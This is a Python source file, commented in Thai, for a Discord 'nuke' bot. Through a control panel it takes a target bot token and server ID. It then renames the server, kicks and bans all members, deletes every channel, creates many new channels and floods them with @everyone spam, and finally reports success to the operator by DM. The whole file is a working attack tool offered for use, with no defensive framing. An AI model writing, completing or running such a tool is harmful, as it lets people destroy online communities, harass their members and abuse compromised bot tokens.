import nextcord
from nextcord.ext import commands
from dotenv import load_dotenv
import os
import asyncio

# โหลดค่าจากไฟล์ .env
load_dotenv()

# ดึง Token มาเก็บไว้ในตัวแปร
TOKEN = os.getenv("bomdis_token")

# -------------------------------------------------------------------
# วางลิงก์รูปภาพ หรือ GIF ตรงนี้ (ต้องขึ้นต้นด้วย http:// หรือ https://)
# -------------------------------------------------------------------
PANEL_IMAGE_URL = "https://cdn.discordapp.com/attachments/1168170116383522817/1550275237222940783/isaack.gif?ex=6aadbdd3&is=6aac6c53&hm=11c2557df17fe3a4b88ce48c5d78e293fd50fbedd48b82863ca0d36a784cb429&"

intents = nextcord.Intents.default()
intents.members = True  
intents.message_content = True  # <--- เพิ่มบรรทัดนี้เข้าไป
bot = commands.Bot(command_prefix="!", intents=intents)

# -------------------------------------------------------------------
# Data Class สำหรับเก็บสถานะ
# -------------------------------------------------------------------
class ConfigState:
    def __init__(self):
        self.reset()

    def reset(self):
        self.bot_token = "ยังไม่ได้ระบุ"
        self.server_id = "ยังไม่ได้ระบุ"
        self.new_guild_name = "ยังไม่ได้ระบุ"
        self.channel_name = "ยังไม่ได้ระบุ"
        self.spam_message = "||@everyone|| "
        self.channel_count = 10
        self.message_count = 50
        self.do_kick = False
        self.do_ban = False

user_configs = {}

def get_user_config(user_id: int) -> ConfigState:
    if user_id not in user_configs:
        user_configs[user_id] = ConfigState()
    return user_configs[user_id]

def build_config_embed(config: ConfigState, user: nextcord.User) -> nextcord.Embed:
    token_display = f"`{config.bot_token[:10]}...`" if config.bot_token != "ยังไม่ได้ระบุ" else "`ยังไม่ได้ตั้งค่า`"
    server_display = f"`{config.server_id}`" if config.server_id != "ยังไม่ได้ระบุ" else "`ยังไม่ได้ตั้งค่า`"
    name_display = f"`{config.new_guild_name}`" if config.new_guild_name != "ยังไม่ได้ระบุ" else "`ไม่เปลี่ยนชื่อ`"
    
    msg_preview = config.spam_message if len(config.spam_message) <= 25 else f"{config.spam_message[:25]}..."

    kick_txt = "✅ เปิด" if config.do_kick else "❌ ปิด"
    ban_txt = "✅ เปิด" if config.do_ban else "❌ ปิด"

    embed = nextcord.Embed(
        title="",
        description=f"ตั้งค่าคำสั่งสำหรับผู้ใช้: **{user.display_name}**\nกรอกข้อมูลตามปุ่มด้านล่าง เมื่อพร้อมแล้วกด **▶️ เริ่มทำงาน**",
        color=0x2b2d31
    )
    embed.add_field(name="🔑 TOKEN บอท", value=token_display, inline=True)
    embed.add_field(name="🎯 ID เซิร์ฟเวอร์", value=server_display, inline=True)
    embed.add_field(name="✏️ ชื่อดิสใหม่", value=name_display, inline=True)
    embed.add_field(name="🏷️ ชื่อห้อง", value=f"`{config.channel_name}`", inline=True)
    embed.add_field(name="📁 จำนวนห้อง", value=f"`{config.channel_count}` ห้อง", inline=True)
    embed.add_field(name="💬 จำนวนข้อความ", value=f"`{config.message_count}` ข้อความ/ห้อง", inline=True)
    embed.add_field(name="💬 ข้อความที่จะส่ง", value=f"```{msg_preview}```", inline=False)
    embed.add_field(name="🔨 เตะคน", value=kick_txt, inline=True)
    embed.add_field(name="🚫 แบนคน", value=ban_txt, inline=True)
    
    if PANEL_IMAGE_URL and PANEL_IMAGE_URL.startswith(("http://", "https://")):
        try:
            embed.set_image(url=PANEL_IMAGE_URL)
        except Exception:
            pass
        
    embed.set_footer(text=" | กดล้างค่าเพื่อรีเซ็ตทั้งหมด")
    return embed

# -------------------------------------------------------------------
# Single-Input Modals
# -------------------------------------------------------------------
class InputTokenModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__(title="ตั้งค่า Bot Token")
        self.val = nextcord.ui.TextInput(label="🔑 TOKEN บอทเป้าหมาย", placeholder="วาง Token ที่นี่...", required=True)
        self.add_item(self.val)

    async def callback(self, interaction: nextcord.Interaction):
        config = get_user_config(interaction.user.id)
        config.bot_token = self.val.value.strip()
        await interaction.response.edit_message(embed=build_config_embed(config, interaction.user))

class InputServerModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__(title="ตั้งค่า ID เซิร์ฟเวอร์")
        self.val = nextcord.ui.TextInput(label="🎯 ID เซิร์ฟเวอร์เป้าหมาย", placeholder="เช่น 1234567890", required=True)
        self.add_item(self.val)

    async def callback(self, interaction: nextcord.Interaction):
        config = get_user_config(interaction.user.id)
        config.server_id = self.val.value.strip()
        await interaction.response.edit_message(embed=build_config_embed(config, interaction.user))

class InputNameModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__(title="ตั้งค่าชื่อดิสใหม่")
        self.val = nextcord.ui.TextInput(label="✏️ ชื่อดิสใหม่ (เว้นว่างได้ถ้าไม่เปลี่ยน)", placeholder="เช่น HACKED BY NARUKHIN", required=False)
        self.add_item(self.val)

    async def callback(self, interaction: nextcord.Interaction):
        config = get_user_config(interaction.user.id)
        config.new_guild_name = self.val.value.strip() if self.val.value.strip() else "ยังไม่ได้ระบุ"
        await interaction.response.edit_message(embed=build_config_embed(config, interaction.user))

class InputChannelNameModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__(title="ตั้งค่าชื่อห้องที่ต้องการสร้าง")
        self.val = nextcord.ui.TextInput(label="🏷️ ชื่อห้อง", placeholder="เช่น ...", default_value="ยังไม่ได้ระบุ", required=True)
        self.add_item(self.val)

    async def callback(self, interaction: nextcord.Interaction):
        config = get_user_config(interaction.user.id)
        config.channel_name = self.val.value.strip()
        await interaction.response.edit_message(embed=build_config_embed(config, interaction.user))

class InputSpamMessageModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__(title="ตั้งค่าข้อความที่จะสแปม")
        self.val = nextcord.ui.TextInput(
            label="💬 ข้อความที่ต้องการส่ง", 
            style=nextcord.TextInputStyle.paragraph,
            placeholder="พิมพ์ข้อความที่ต้องการ...", 
            default_value="||@everyone||", 
            required=True,
            max_length=2000
        )
        self.add_item(self.val)

    async def callback(self, interaction: nextcord.Interaction):
        config = get_user_config(interaction.user.id)
        config.spam_message = self.val.value
        await interaction.response.edit_message(embed=build_config_embed(config, interaction.user))

class InputChannelCountModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__(title="ตั้งค่าจำนวนห้อง")
        self.val = nextcord.ui.TextInput(label="📁 จำนวนห้องที่ต้องการสร้าง", placeholder="ใส่เฉพาะตัวเลข เช่น 10, 20", default_value="10", required=True)
        self.add_item(self.val)

    async def callback(self, interaction: nextcord.Interaction):
        config = get_user_config(interaction.user.id)
        config.channel_count = int(self.val.value) if self.val.value.isdigit() else 10
        await interaction.response.edit_message(embed=build_config_embed(config, interaction.user))

class InputMessageCountModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__(title="ตั้งค่าจำนวนข้อความ")
        self.val = nextcord.ui.TextInput(label="💬 จำนวนข้อความต่อห้อง", placeholder="ใส่เฉพาะตัวเลข เช่น 50, 100", default_value="50", required=True)
        self.add_item(self.val)

    async def callback(self, interaction: nextcord.Interaction):
        config = get_user_config(interaction.user.id)
        config.message_count = int(self.val.value) if self.val.value.isdigit() else 50
        await interaction.response.edit_message(embed=build_config_embed(config, interaction.user))

class InputKickModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__(title="ตั้งค่าระบบเตะสมาชิก")
        self.val = nextcord.ui.TextInput(label="🔨 เตะคนในดิส (ใส่ 1 = เปิด, 2 = ปิด)", default_value="2", max_length=1, required=True)
        self.add_item(self.val)

    async def callback(self, interaction: nextcord.Interaction):
        config = get_user_config(interaction.user.id)
        config.do_kick = self.val.value.strip() == "1"
        await interaction.response.edit_message(embed=build_config_embed(config, interaction.user))

class InputBanModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__(title="ตั้งค่าระบบแบนสมาชิก")
        self.val = nextcord.ui.TextInput(label="🚫 แบนคนในดิส (ใส่ 1 = เปิด, 2 = ปิด)", default_value="2", max_length=1, required=True)
        self.add_item(self.val)

    async def callback(self, interaction: nextcord.Interaction):
        config = get_user_config(interaction.user.id)
        config.do_ban = self.val.value.strip() == "1"
        await interaction.response.edit_message(embed=build_config_embed(config, interaction.user))

# -------------------------------------------------------------------
# View ปุ่มเลือกเมนู
# -------------------------------------------------------------------
class ControlPanelView(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    # Row 0
    @nextcord.ui.button(label="🔑 TOKEN บอท", style=nextcord.ButtonStyle.secondary, row=0)
    async def btn_token(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        await interaction.response.send_modal(InputTokenModal())

    @nextcord.ui.button(label="🎯 ID เซิร์ฟเวอร์", style=nextcord.ButtonStyle.secondary, row=0)
    async def btn_server(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        await interaction.response.send_modal(InputServerModal())

    # Row 1
    @nextcord.ui.button(label="✏️ ตั้งชื่อดิสใหม่", style=nextcord.ButtonStyle.secondary, row=1)
    async def btn_name(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        await interaction.response.send_modal(InputNameModal())

    @nextcord.ui.button(label="🏷️ ตั้งชื่อห้อง", style=nextcord.ButtonStyle.secondary, row=1)
    async def btn_channel_name(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        await interaction.response.send_modal(InputChannelNameModal())

    # Row 2
    @nextcord.ui.button(label="💬 ตั้งข้อความสแปม", style=nextcord.ButtonStyle.secondary, row=2)
    async def btn_spam_msg(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        await interaction.response.send_modal(InputSpamMessageModal())

    @nextcord.ui.button(label="📁 จำนวนห้อง", style=nextcord.ButtonStyle.secondary, row=2)
    async def btn_ch_count(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        await interaction.response.send_modal(InputChannelCountModal())

    @nextcord.ui.button(label="💬 จำนวนข้อความ", style=nextcord.ButtonStyle.secondary, row=2)
    async def btn_msg_count(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        await interaction.response.send_modal(InputMessageCountModal())

    # Row 3
    @nextcord.ui.button(label="🔨 เตะคน", style=nextcord.ButtonStyle.secondary, row=3)
    async def btn_kick(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        await interaction.response.send_modal(InputKickModal())

    @nextcord.ui.button(label="🚫 แบนคน", style=nextcord.ButtonStyle.secondary, row=3)
    async def btn_ban(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        await interaction.response.send_modal(InputBanModal())

    # Row 4 (ปุ่มควบคุมหลัก)
    @nextcord.ui.button(label="▶️ เริ่มทำงาน", style=nextcord.ButtonStyle.success, row=4)
    async def btn_start(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        config = get_user_config(interaction.user.id)
        if config.bot_token == "ยังไม่ได้ระบุ" or config.server_id == "ยังไม่ได้ระบุ":
            await interaction.response.send_message("⚠️ กรุณากรอก **TOKEN บอท** และ **ID เซิร์ฟเวอร์** ให้ครบถ้วนก่อนเริ่มทำงาน!", ephemeral=True)
            return

        await interaction.response.send_message("🚀 **เริ่มการทำงานเรียบร้อยแล้ว!** ระบบกำลังประมวลผลเบื้องหลัง...", ephemeral=True)
        asyncio.create_task(self.run_nuke_process(config, interaction.user))

    @nextcord.ui.button(label="🔄 ล้างค่า (รีเซ็ต)", style=nextcord.ButtonStyle.danger, row=4)
    async def btn_reset(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        config = get_user_config(interaction.user.id)
        config.reset()
        await interaction.response.edit_message(embed=build_config_embed(config, interaction.user))

    async def run_nuke_process(self, config: ConfigState, user: nextcord.User):
        target_intents = nextcord.Intents.default()
        target_intents.members = True
        target_bot = nextcord.Client(intents=target_intents)

        @target_bot.event
        async def on_ready():
            try:
                guild_id = int(config.server_id)
                guild = target_bot.get_guild(guild_id)
                if not guild:
                    guild = await target_bot.fetch_guild(guild_id)

                if guild:
                    # 1. เปลี่ยนชื่อดิส
                    if config.new_guild_name != "ยังไม่ได้ระบุ":
                        try:
                            await guild.edit(name=config.new_guild_name)
                        except Exception:
                            pass

                    # 2. เตะคน
                    if config.do_kick:
                        try:
                            async for m in guild.fetch_members():
                                if m.id != target_bot.user.id:
                                    try:
                                        await m.kick()
                                    except Exception:
                                        pass
                        except Exception:
                            pass

                    # 3. แบนคน
                    if config.do_ban:
                        try:
                            async for m in guild.fetch_members():
                                if m.id != target_bot.user.id:
                                    try:
                                        await m.ban()
                                    except Exception:
                                        pass
                        except Exception:
                            pass

                    # 4. ลบห้องเดิม
                    channels = await guild.fetch_channels()
                    await asyncio.gather(*[c.delete() for c in channels if isinstance(c, (nextcord.TextChannel, nextcord.VoiceChannel))], return_exceptions=True)

                    # 5. สร้างห้องใหม่
                    created_channels = await asyncio.gather(
                        *[guild.create_text_channel(config.channel_name) for _ in range(config.channel_count)],
                        return_exceptions=True
                    )

                    # 6. สแปมข้อความ
                    valid_channels = [c for c in created_channels if isinstance(c, nextcord.TextChannel)]
                    async def spam_chan(c):
                        for _ in range(config.message_count):
                            try:
                                await c.send(config.spam_message)
                                await asyncio.sleep(0.3)
                            except nextcord.HTTPException as e:
                                if e.status == 429:
                                    retry = getattr(e, 'retry_after', 2)
                                    await asyncio.sleep(retry)
                                else:
                                    break
                            except Exception:
                                break

                    await asyncio.gather(*[spam_chan(c) for c in valid_channels])

                    # 7. ส่ง DM แจ้งเตือนไปยังผู้สั่งการเมื่อเสร็จแล้ว
                    try:
                        dm_embed = nextcord.Embed(
                            title="✅ ดำเนินการเสร็จสิ้นเรียบร้อย!",
                            description=f"ระบบทำงานในเซิร์ฟเวอร์ ID: `{config.server_id}` สำเร็จแล้ว",
                            color=0x00ff00
                        )
                        dm_embed.add_field(name="📁 จำนวนห้องที่สร้าง", value=f"{config.channel_count} ห้อง", inline=True)
                        dm_embed.add_field(name="💬 ข้อความต่อห้อง", value=f"{config.message_count} ข้อความ", inline=True)
                        if PANEL_IMAGE_URL and PANEL_IMAGE_URL.startswith(("http://", "https://")):
                            dm_embed.set_image(url=PANEL_IMAGE_URL)
                        await user.send(embed=dm_embed)
                    except Exception as dm_err:
                        print(f"[!] ไม่สามารถส่ง DM หาผู้ใช้ได้: {dm_err}")

            except Exception as e:
                print(f"[!] เกิดข้อผิดพลาด: {e}")
            finally:
                await target_bot.close()

        try:
            await target_bot.start(config.bot_token)
        except Exception as e:
            print(f"[!] ไม่สามารถเข้าใช้งาน Token ได้: {e}")

# -------------------------------------------------------------------
# Command รัน Panel (ใช้ระบบ slash_command ของ nextcord)
# -------------------------------------------------------------------
@bot.slash_command(name="setup_panel", description="เปิดแผงควบคุม CONFIG PANEL")
async def setup_panel(interaction: nextcord.Interaction):
    if not interaction.user.guild_permissions.administrator:
        return await interaction.response.send_message("❌ คุณไม่มีสิทธิ์ใช้งานคำสั่งนี้ (ต้องเป็นแอดมินเท่านั้น)", ephemeral=True)
    
    config = get_user_config(interaction.user.id)
    embed = build_config_embed(config, interaction.user)
    view = ControlPanelView()
    await interaction.response.send_message(embed=embed, view=view)

@bot.event
async def on_ready():
    print(f"[*] บอทหลักพร้อมทำงาน: {bot.user.name}")

if __name__ == "__main__":
    bot.run(TOKEN)
